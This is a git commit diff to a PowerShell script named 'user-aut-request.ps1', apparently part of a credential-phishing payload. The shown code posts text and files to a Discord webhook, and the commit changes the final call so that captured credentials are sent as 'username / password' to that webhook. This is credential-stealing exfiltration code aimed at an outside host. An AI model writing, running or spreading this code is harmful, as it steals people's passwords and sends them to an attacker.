b5fe98a4c922f23d9fea635d9c4bb028d0427550
nidez <pistolesi.marco@gmail.com>
2024-01-24 02:26:09 +0100

    Update user-aut-request.ps1

--- user-aut-request.ps1
+++ user-aut-request.ps1
@@ -117,7 +117,8 @@ if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "$creds"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "$creds.username / $creds.password"}
+
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
